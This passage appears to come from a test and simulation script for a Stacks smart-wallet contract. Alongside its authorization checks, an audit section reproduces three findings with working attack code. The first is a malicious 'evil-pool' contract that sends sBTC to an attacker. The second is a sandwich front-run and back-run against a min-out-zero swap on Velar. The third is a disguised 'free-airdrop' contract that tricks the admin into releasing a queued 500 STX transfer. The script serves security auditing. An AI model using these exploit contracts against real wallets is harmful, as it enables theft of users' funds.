          await tx("place-ladder wrong-side rung -> dispatcher u7104", OWNER, SAFE, "place-ladder", [stringAsciiCV(pair), trueCV(), uintCV(amt), listCV([tupleCV({ rung: P_(`${D}.${LADDER[pair].sell(1)}`), amount: uintCV(amt) })]), noneCV(), noneCV()], E(7104));
          await tx("place-ladder bad pair -> u4024", OWNER, SAFE, "place-ladder", [stringAsciiCV("eth-stx"), trueCV(), uintCV(total), allocCV, noneCV(), noneCV()], E(4024));
          await tx("place-ladder stranger -> u4001", STRANGER, SAFE, "place-ladder", [stringAsciiCV(pair), trueCV(), uintCV(total), allocCV, noneCV(), noneCV()], E(4001));
          // signed-field mutations (u4002)
          const a = nextAuth();
          const s = sigAuth(a, msgHash(SAFE, T3.place(a, pair, buy, total, allocs)));
          const alt = [{ rung: rungs[1], amount: amt }, { rung: rungs[0], amount: amt }];
          await tx("place-ladder signed allocations reordered -> u4002", RELAYER, SAFE, "place-ladder", [stringAsciiCV(pair), trueCV(), uintCV(total), listCV(alt.map((x) => tupleCV({ rung: P_(x.rung), amount: uintCV(x.amount) }))), s, noneCV()], E(4002));
          await tx("place-ladder signed buy flipped -> u4002", RELAYER, SAFE, "place-ladder", [stringAsciiCV(pair), falseCV(), uintCV(total), allocCV, s, noneCV()], E(4002));
          await tx("place-ladder signed pair changed -> u4002", RELAYER, SAFE, "place-ladder", [stringAsciiCV("stx-usdcx"), trueCV(), uintCV(total), allocCV, s, noneCV()], E(4002));
          await tx("place-ladder signed total changed -> u4002", RELAYER, SAFE, "place-ladder", [stringAsciiCV(pair), trueCV(), uintCV(total - 1n), allocCV, s, noneCV()], E(4002));
        }
        const r = await tx(`place-ladder ${pair} ${side} ${passkey ? "passkey + gas" : "admin"}: ${total} ${asset} over 2 rungs`, sender, SAFE, "place-ladder", [stringAsciiCV(pair), boolCV(buy), uintCV(total), allocCV, sa, gas], OK);
        const mid = await bals(SAFE);
        const g = passkey ? gasFee : 0n;
        check(`  only ${total} ${asset} left the safe${g ? ` (+ ${g} sats gas)` : ""}`,
          before[asset] - mid[asset] === total + (asset === "sbtc" ? g : 0n) && (asset === "sbtc" || before.sbtc - mid.sbtc === g), show({ before, mid }));
        check("  ladder-dispatched print: member = safe", prints(r.receipt).some((p) => p.v?.event === "ladder-dispatched" && p.v.member === SAFE), show(prints(r.receipt).map((p) => p.v?.event)));
        // withdraw in full (amount above the member value exits in full)
        const reqs = rungs.map((x) => ({ rung: x, amount: UMAX }));
        const reqCV = listCV(reqs.map((x) => tupleCV({ rung: P_(x.rung), amount: uintCV(x.amount) })));
        let wsa = noneCV(), wsender = OWNER, wgas = noneCV();
        if (passkey) { const a = nextAuth(); wsa = sigAuth(a, msgHash(SAFE, T3.withdraw(a, pair, buy, reqs))); wsender = RELAYER; wgas = GASCV(); }
        if (pair === "sbtc-stx" && buy) {
          const a = nextAuth(); const s = sigAuth(a, msgHash(SAFE, T3.withdraw(a, pair, buy, reqs)));
          await tx("withdraw-ladder signed request amount changed -> u4002", RELAYER, SAFE, "withdraw-ladder", [stringAsciiCV(pair), trueCV(), listCV(reqs.map((x, i) => tupleCV({ rung: P_(x.rung), amount: uintCV(i ? x.amount : 1n) }))), noneCV(), s, noneCV()], E(4002));
          await tx("withdraw-ladder signed buy flipped -> u4002", RELAYER, SAFE, "withdraw-ladder", [stringAsciiCV(pair), falseCV(), reqCV, noneCV(), s, noneCV()], E(4002));
          await tx("withdraw-ladder stranger -> u4001", STRANGER, SAFE, "withdraw-ladder", [stringAsciiCV(pair), trueCV(), reqCV, noneCV(), noneCV(), noneCV()], E(4001));
        }
        const w = await tx(`withdraw-ladder ${pair} ${side} ${passkey ? "passkey + gas" : "admin"} (with-all-assets-unsafe)`, wsender, SAFE, "withdraw-ladder", [stringAsciiCV(pair), boolCV(buy), reqCV, noneCV(), wsa, wgas], OK);
        if (!OK(w.res)) note(`withdraw-ladder ${pair} ${side}: ${show(w.res ?? w.vm)}`);
        const end = await bals(SAFE);
        // what the rungs paid the safe (transfer events to the safe in the withdraw receipt)
        const evs = (w.receipt?.events ?? []).map((e) => (typeof e === "string" ? JSON.parse(e) : e)).filter((e) => e.committed !== false);
        const tok = { sbtc: SBTC, usdcx: USDCX }[asset];
        const paid = evs.reduce((acc, e) => {
          if (asset === "stx" && e.stx_transfer_event?.recipient === SAFE) return acc + BigInt(e.stx_transfer_event.amount);
          if (asset !== "stx" && e.ft_transfer_event?.recipient === SAFE && e.ft_transfer_event.asset_identifier.startsWith(tok)) return acc + BigInt(e.ft_transfer_event.amount);
          return acc;
        }, 0n);
        const gW = asset === "sbtc" ? g : 0n;
        check(`  safe kept every unit the rungs paid back (${paid} ${asset}), gas aside`,
          end[asset] - mid[asset] === paid - gW && (asset === "sbtc" || mid.sbtc - end.sbtc === g), show({ mid, end, paid }));
        const short = total - paid;
        check(`  rungs paid back ${paid} of ${total} ${asset} (shortfall ${short}: live rung share rounding, <= 1 unit per rung)`, short >= 0n && short <= 2n, show({ paid, total }));
        if (short > 0n) note(`live rung rounding: ${pair} ${side} full withdraw of ${total} returned ${paid} (${short} unit${short > 1n ? "s" : ""} short; rung contracts, not juice-trading)`);
        let csa = noneCV(), csender = OWNER;
        if (passkey) { const a = nextAuth(); csa = sigAuth(a, msgHash(SAFE, T3.claim(a, pair, buy, rungs))); csender = RELAYER; }
        if (pair === "sbtc-stx" && buy) {
          const a = nextAuth(); const s = sigAuth(a, msgHash(SAFE, T3.claim(a, pair, buy, rungs)));
          await tx("claim-ladder signed rung list changed -> u4002", RELAYER, SAFE, "claim-ladder", [stringAsciiCV(pair), trueCV(), listCV([P_(rungs[0])]), s, noneCV()], E(4002));
        }
        const c = await call(csender, SAFE, "claim-ladder", [stringAsciiCV(pair), boolCV(buy), listCV(rungs.map(P_)), csa, noneCV()]);
        const after = await bals(SAFE);
        check(`claim-ladder ${pair} ${side} ${passkey ? "passkey" : "admin"}: auth passes, nothing moves out (as-contract? with no allowance)`,
          !c.vm && (OK(c.res) || (c.res?.err !== undefined && ![4001n, 4002n, 4019n].includes(c.res.err))) && after[asset] >= end[asset] && after.sbtc >= end.sbtc, show(c.res ?? c.vm));
      }
    }
    // token lock on the ladder passkey path
    await tx("admin toggle-token-lock true", OWNER, SAFE, "toggle-token-lock", [trueCV(), noneCV(), noneCV()], OK);
    {
      const rungs = [`${D}.${LADDER["sbtc-stx"].buy(1)}`];
      const a = nextAuth();
      await tx("token lock on: passkey claim-ladder -> u4019", RELAYER, SAFE, "claim-ladder", [stringAsciiCV("sbtc-stx"), trueCV(), listCV(rungs.map(P_)), sigAuth(a, msgHash(SAFE, T3.claim(a, "sbtc-stx", true, rungs))), noneCV()], E(4019));
    }
    await tx("admin toggle-token-lock false", OWNER, SAFE, "toggle-token-lock", [falseCV(), noneCV(), noneCV()], OK);
  }

  // =========================================================================
  group("E v19 functions wired into the safe");
  {
    const PEPE_SMART = `${D}.pepe-smart-faktory`;
    check("registry: pepe-smart-faktory approved", (await evalIn(`${D}.fakfun-smart-router-registry`, `(is-approved-router '${PEPE_SMART})`)) === true);
    await tx("smart-buy-sbtc admin (pepe-smart, 2,000 sats, fak-ratio 100)", OWNER, SAFE, "smart-buy-sbtc", [P_(PEPE_SMART), uintCV(2000), uintCV(1), uintCV(100), falseCV(), noneCV(), noneCV()], OK);
    {
      const a = nextAuth();
      const h = hex(await evalIn(SAFE, `(contract-call? '${D}.smart-execute-auth-helper build-smart-execute-hash { auth-id: u${a}, op: 0x00, smart: '${PEPE_SMART}, amount: u2000, min-out: u1, fak-ratio: u100, flag: false })`));
      const before = await sb(SAFE);
      await tx("smart-buy-sbtc passkey + gas", RELAYER, SAFE, "smart-buy-sbtc", [P_(PEPE_SMART), uintCV(2000), uintCV(1), uintCV(100), falseCV(), sigAuth(a, Buffer.from(h, "hex")), GASCV()], OK);
      check("  safe paid 2,000 sats + gas", before - (await sb(SAFE)) === 2000n + gasFee);
      await tx("smart-buy-sbtc passkey, amount changed after signing -> u4002", RELAYER, SAFE, "smart-buy-sbtc", [P_(PEPE_SMART), uintCV(2001), uintCV(1), uintCV(100), falseCV(), sigAuth(a + 0, Buffer.from(h, "hex")), noneCV()], E(4002));
    }
    await tx("smart-buy-stx admin (pepe-smart, 2 STX)", OWNER, SAFE, "smart-buy-stx", [P_(PEPE_SMART), uintCV(2_000_000), uintCV(1), uintCV(100), falseCV(), noneCV(), noneCV()], OK);
    await tx("smart-buy-sbtc unregistered router -> u4023", OWNER, SAFE, "smart-buy-sbtc", [P_(`${D}.mock-smart-router-jt`), uintCV(1000), uintCV(1), uintCV(100), falseCV(), noneCV(), noneCV()], E(4023));
    await tx("smart-buy-sbtc stranger -> u4001", STRANGER, SAFE, "smart-buy-sbtc", [P_(PEPE_SMART), uintCV(1000), uintCV(1), uintCV(100), falseCV(), noneCV(), noneCV()], E(4001));
    await tx("faktory-execute stranger -> u4001", STRANGER, SAFE, "faktory-execute", [P_(`${D}.mock-smart-router-jt`), uintCV(1), noneCV(), P_(SBTC), stringAsciiCV("sbtc-token"), noneCV(), noneCV()], (v) => v?.err === 4001n || v === null);
    await tx("faktory-nft-execute stranger -> u4001", STRANGER, SAFE, "faktory-nft-execute", [P_(`${D}.pepe-nft-marketplace`), uintCV(1), P_("SP16SRR777TVB1WS5XSS9QT3YEZEC9JQFKYZENRAJ.bitcoin-pepe"), stringAsciiCV("x"), P_(SBTC), stringAsciiCV("sbtc-token"), uintCV(1), someCV(bufferCV(Buffer.from([1]))), noneCV(), noneCV()], (v) => v?.err === 4001n);
    await tx("wager-deposit admin, pubkey not registered to this safe -> u4001", OWNER, SAFE, "wager-deposit", [P_(SBTC), stringAsciiCV("sbtc-token"), uintCV(1000), bufferCV(Buffer.from(KEY2.pubKeyHex, "hex")), noneCV(), noneCV()], E(4001));
    // admin path ignores the gas param (no sBTC moves for gas)
    const before = await sb(SAFE);
    await tx("smart-buy-sbtc admin with gas param: gas ignored", OWNER, SAFE, "smart-buy-sbtc", [P_(PEPE_SMART), uintCV(1000), uintCV(1), uintCV(100), falseCV(), noneCV(), GASCV()], OK);
    check("  safe paid exactly 1,000 sats (no gas on the admin path)", before - (await sb(SAFE)) === 1000n);
  }

  // =========================================================================
  group("F findings: #2 fixed (lock blocks the 6 passkey branches), #3/#4 repros (expected result = the bug)");
  // ---- #2: one passkey drains sBTC through faktory-execute while the token lock is on,
  //          above the 100k sBTC threshold, no pending op
  {
    const evil = `(define-public (execute (amount uint) (opcode (optional (buff 16))))
  (begin (try! (contract-call? '${SBTC} transfer amount tx-sender '${ATTACKER} none)) (ok { dx: amount, dy: u0, dk: u0 })))
(define-read-only (quote (amount uint) (opcode (optional (buff 16)))) (ok { dx: u0, dy: u0, dk: u0 }))`;
    const r = await deployRaw(ATTACKER, "evil-pool", evil, 4);
    must("attacker deploys evil-pool (dexterity pool trait shape, execute = send sBTC to attacker)", r.ok, r.detail);
    await tx("owner turns the token lock ON (passkey should be frozen)", OWNER, SAFE, "toggle-token-lock", [trueCV(), noneCV(), noneCV()], OK);
    {
      const a = nextAuth();
      const h = hex(await evalIn(SAFE, `(contract-call? '${D}.smart-wallet-standard-auth-helpers-v7 build-sip010-transfer-hash { auth-id: u${a}, amount: u1000, recipient: '${ATTACKER}, memo: none, sip010: '${SBTC} })`));
      await tx("control: passkey sip010-transfer while locked -> u4019", RELAYER, SAFE, "sip010-transfer", [uintCV(1000), P_(ATTACKER), noneCV(), P_(SBTC), stringAsciiCV("sbtc-token"), sigAuth(a, Buffer.from(h, "hex")), noneCV()], E(4019));
    }
    // control: core-v2 refuses an unregistered pool (u1003), so the drain needs a registered pool or market
    {
      const a = nextAuth();
      const h = hex(await evalIn(SAFE, `(contract-call? '${D}.smart-wallet-standard-auth-helpers-v7 build-faktory-execute-hash { auth-id: u${a}, pool: '${ATTACKER}.evil-pool, amount: u500000, opcode: none })`));
      await tx("control: passkey faktory-execute through an UNREGISTERED pool while locked -> u4019 (lock checked first since the #2 fix)", ATTACKER, SAFE, "faktory-execute",
        [P_(`${ATTACKER}.evil-pool`), uintCV(500_000), noneCV(), P_(SBTC), stringAsciiCV("sbtc-token"), sigAuth(a, Buffer.from(h, "hex")), noneCV()], E(4019));
    }
    // #2 FIXED (2b471f6): every copied v19 passkey branch now opens with the
    // token-lock assert. Lock ON -> err-token-locked u4019 on all six, and
    // nothing leaves the safe. The sig is well formed but never reached.
    {
      const MIA = `${D}.mia-pool-faktory`, MKT = `${D}.leo-nft-market-faktory`, NFT = "SP2N959SER36FZ5QT1CX9BR63W3E8X35WQCMBYYWC.leo-cats";
      const dummy = () => sigAuth(nextAuth(), crypto.randomBytes(32));
      const pk33 = bufferCV(Buffer.from(KEY.pubKeyHex, "hex"));
      const cases = [
        ["faktory-execute (buy 500,000 sats on sBTC-MIA)", "faktory-execute", [P_(MIA), uintCV(500_000), noneCV(), P_(SBTC), stringAsciiCV("sbtc-token"), dummy(), noneCV()]],
        ["faktory-nft-execute (buy a leo-cat at 600,000 sats)", "faktory-nft-execute", [P_(MKT), uintCV(2), P_(NFT), stringAsciiCV("leo-cats"), P_(SBTC), stringAsciiCV("sbtc-token"), uintCV(600_000), someCV(bufferCV(Buffer.from([1]))), dummy(), noneCV()]],
        ["faktory-place-order", "faktory-place-order", [P_(MIA), P_(SBTC), stringAsciiCV("sbtc-token"), uintCV(500_000), noneCV(), dummy(), noneCV()]],
        ["faktory-process", "faktory-process", [P_(MIA), uintCV(1), noneCV(), dummy(), noneCV()]],
        ["wager-deposit", "wager-deposit", [P_(SBTC), stringAsciiCV("sbtc-token"), uintCV(500_000), pk33, dummy(), noneCV()]],
        ["smart-buy-sbtc (passkey branch of private authorize-smart)", "smart-buy-sbtc", [P_(`${D}.pepe-smart-faktory`), uintCV(500_000), uintCV(1), uintCV(100), falseCV(), dummy(), noneCV()]],
      ];
      for (const [l, fn, args] of cases) {
        const safe0 = await sb(SAFE), n0 = await evalIn(SAFE, "(var-get operation-nonce)");
        await tx(`#2 FIXED: lock ON, passkey ${l} -> u4019 err-token-locked`, RELAYER, SAFE, fn, args, E(4019));
        check(`  ${fn}: safe sBTC unchanged, no pending op`, (await sb(SAFE)) === safe0 && (await evalIn(SAFE, "(var-get operation-nonce)")) === n0);
      }
    }
    // admin key alone: same threshold bypass (no pending op)
    {
      const n0 = await evalIn(SAFE, "(var-get operation-nonce)");
      const s0 = await sb(SAFE);
      await tx("FINDING #2 (admin key alone): faktory-execute buy 200,000 sats (2x threshold) on sBTC-MIA -> runs at once", OWNER, SAFE, "faktory-execute",
        [P_(`${D}.mia-pool-faktory`), uintCV(200_000), noneCV(), P_(SBTC), stringAsciiCV("sbtc-token"), noneCV(), noneCV()], OK);
      check("  no pending op, safe -200,000", (await evalIn(SAFE, "(var-get operation-nonce)")) === n0 && s0 - (await sb(SAFE)) === 200_000n);
    }
    await tx("owner turns the token lock OFF", OWNER, SAFE, "toggle-token-lock", [falseCV(), noneCV(), noneCV()], OK);
  }

  // ---- #3: jing-swap one key, min-out 0, unsigned route -> sandwich on Velar
  {
    const velar = async () => {
      const pool = (await evalIn(VELAR_POOL, "(get-pool)"))?.ok;
      const fees = await evalIn(pool.fees, "(get-fees)");
      const fee = (fees?.ok ?? fees)["swap-fee"];
      const s0 = pool.token0 === SBTC;
      return { pool, fee, R_s: s0 ? pool.reserve0 : pool.reserve1, R_x: s0 ? pool.reserve1 : pool.reserve0 };
    };
    const cpOut = (fee, inp, rin, rout) => { const adj = (inp * fee.num) / fee.den; return (adj * rout) / (rin + adj); };
    const front = (amt) => [uintCV(amt), uintCV(0), uintCV(1), noneCV(), noneCV(), amm4({ velar: amt }), amm4({}), uintCV(0), ZR0];
    const V = 2_000_000n; // victim sells 0.02 BTC (20x the sBTC threshold) through the safe
    let q = await velar();
    console.log(`  velar 0070 ${show({ t0: q.pool.token0, t1: q.pool.token1, r0: q.pool.reserve0, r1: q.pool.reserve1, fee: q.fee })}`);
    const fair = cpOut(q.fee, V, q.R_s, q.R_x);
    const FRONT = q.R_s; // front-run = the pool's whole sBTC side (about the profit-maximising size for this V)
    check(`velar sBTC/STX pool: sBTC reserve ${q.R_s}, STX reserve ${q.R_x}; fair (cp quote, fee ${q.fee.num}/${q.fee.den}) for ${V} sats = ${fair} uSTX`, q.R_s > 0n && q.R_x > 0n);
    await sbtcTransfer(OWNER, ATTACKER, FRONT);
    // what one key signs: amount, action, limit, min-out 0. The route is not signed.
    const a = nextAuth();
    const sa = sigAuth(a, msgHash(SAFE, T3.jingSwap(a, "sbtc-stx", V, 1n, 0n)));
    const attS0 = await sb(ATTACKER), attX0 = await st(ATTACKER);
    const f = await tx(`sandwich front-run: attacker sells ${FRONT} sats on Velar (router v6-1, velar leg)`, ATTACKER, R_SS, "swap-sbtc-for-stx", front(FRONT), OK);
    const nonce0 = await evalIn(SAFE, "(var-get operation-nonce)");
    const x0 = await st(SAFE);
    const v = await tx("FINDING #3 repro: relayer sends the passkey's swap (min-out 0) all to Velar after the front-run -> ok", RELAYER, SAFE, "jing-swap",
      jsArgs("sbtc-stx", { amount: V, minOut: 0n, amts: { velar: V } }, sa), OK);
    const got = (await st(SAFE)) - x0;
    const lossBp = fair > 0n ? ((fair - got) * 10000n) / fair : 0n;
    const frontOut = f.res?.ok?.out ?? 0n;
    await tx("sandwich back-run: attacker sells the STX it got back into sBTC on Velar", ATTACKER, R_SS, "swap-stx-for-sbtc", front(frontOut), OK);
    const attS1 = await sb(ATTACKER), attX1 = await st(ATTACKER);
    const profit = attS1 - attS0;
    const big = check(`  victim got ${got} uSTX vs fair ${fair} (loss ${Number(lossBp) / 100}%), no pending op for 20x threshold; attacker net ${profit} sats, ${attX1 - attX0} uSTX`,
      lossBp >= 5000n && profit > 0n && attX1 === attX0 && (await evalIn(SAFE, "(var-get operation-nonce)")) === nonce0, show({ got, fair, lossBp, profit }));
    if (OK(v.res) && big) finding(`#3 jing-swap: one passkey signs min-out 0, route unsigned -> relayer-sandwich on Velar: victim loses ${Number(lossBp) / 100}% of a 0.02 BTC swap, attacker nets +${profit} sats`);
    // control: the same sandwich against a signed min-out of 95% of fair reverts
    {
      q = await velar();
      const fair2 = cpOut(q.fee, V, q.R_s, q.R_x);
      const minOut = (fair2 * 95n) / 100n;
      const a2 = nextAuth();
      const sa2 = sigAuth(a2, msgHash(SAFE, T3.jingSwap(a2, "sbtc-stx", V, 1n, minOut)));
      const need = q.R_s - (await sb(ATTACKER));
      if (need > 0n) await sbtcTransfer(OWNER, ATTACKER, need);
      const f2 = await tx("control: front-run again", ATTACKER, R_SS, "swap-sbtc-for-stx", front(q.R_s), OK);
      await tx("control: signed min-out = 95% of fair, routed to Velar after the front-run -> u3002", RELAYER, SAFE, "jing-swap",
        jsArgs("sbtc-stx", { amount: V, minOut, amts: { velar: V } }, sa2), E(3002));
      const o2 = f2.res?.ok?.out ?? 0n;
      await tx("control: attacker unwinds", ATTACKER, R_SS, "swap-stx-for-sbtc", front(o2), OK);
    }
    // admin path: one admin key swaps 2x the sBTC threshold with min-out 0, no pending op
    {
      const n0 = await evalIn(SAFE, "(var-get operation-nonce)");
      await tx("FINDING #3 (admin key alone): jing-swap 200,000 sats (2x threshold), min-out 0 -> runs at once", OWNER, SAFE, "jing-swap",
        jsArgs("sbtc-stx", { amount: 200_000n, minOut: 0n }), OK);
      check("  no pending op", (await evalIn(SAFE, "(var-get operation-nonce)")) === n0);
    }
  }

  // ---- #4: passkey-created pending op confirmed by a hostile contract the admin calls
  {
    const AMT = 500_000_000n; // 500 STX, 5x the STX threshold -> queued
    const a = nextAuth();
    const h = hex(await evalIn(SAFE, `(contract-call? '${D}.smart-wallet-standard-auth-helpers-v7 build-stx-transfer-hash { auth-id: u${a}, amount: u${AMT}, recipient: '${ATTACKER}, memo: none })`));
    const opId = await evalIn(SAFE, "(var-get operation-nonce)");
    await tx("passkey stx-transfer 500 STX to attacker -> queued (over threshold)", RELAYER, SAFE, "stx-transfer", [uintCV(AMT), P_(ATTACKER), noneCV(), sigAuth(a, Buffer.from(h, "hex")), noneCV()], OK);
    const op = await evalIn(SAFE, `(get-pending-operation u${opId})`);
    must(`  pending op u${opId}: passkey-created, not executed`, op && op["passkey-created"] === true && op.executed === false, show(op));
    await tx("  execute-pending-stx-transfer before the cooldown -> u4014", OWNER, SAFE, "execute-pending-stx-transfer", [uintCV(opId), noneCV()], E(4014));
    await tx("  stranger execute-pending-stx-transfer-now -> u4001", STRANGER, SAFE, "execute-pending-stx-transfer-now", [uintCV(opId), noneCV(), noneCV(), noneCV()], E(4001));
    const hostile = `(define-public (claim-airdrop)
  (contract-call? '${SAFE} execute-pending-stx-transfer-now u${opId} none none none))`;
    const r = await deployRaw(ATTACKER, "free-airdrop", hostile, 4);
    must("attacker deploys free-airdrop (claim-airdrop calls the safe's execute-pending-stx-transfer-now)", r.ok, r.detail);
    const att0 = await st(ATTACKER);
    const x = await tx("FINDING #4 repro: admin calls free-airdrop.claim-airdrop -> the passkey op executes (tx-sender = admin)", OWNER, `${ATTACKER}.free-airdrop`, "claim-airdrop", [], OK);
    const got = (await st(ATTACKER)) - att0;
    const ok4 = check("  attacker +500 STX, op executed, no cooldown", got === AMT && (await evalIn(SAFE, `(get-pending-operation u${opId})`))?.executed === true, show({ got }));
    if (OK(x.res) && ok4) finding("#4 execute-pending-stx-transfer-now: passkey-created op confirmed through `is-admin-calling tx-sender`, so any contract the admin calls confirms it (500 STX out, cooldown skipped)");
  }

  summary();
}

function summary() {
  console.log("\nGroups:");
  for (const [g, [p, n]] of Object.entries(S.groups)) console.log(`  ${p === n ? "PASS" : "FAIL"} ${g}: ${p}/${n}`);
  for (const n of S.notes) console.log(`  note: ${n}`);
  if (S.findings.length) { console.log("\nFindings reproduced:"); for (const f of S.findings) console.log(`  ${f}`); }
  if (S.fails.length) { console.log("\nFailing checks:"); for (const f of S.fails) console.log(`  ${f}`); }
  console.log(`\n${S.passed}/${S.checks} checks green`);
  console.log(`https://stxer.xyz/simulations/mainnet/${S.sid}`);
}

main().catch((e) => {
  if (!(e instanceof Stop)) console.error(e);
  else console.log(e.message);
  if (S.sid) summary();
  process.exit(1);
});
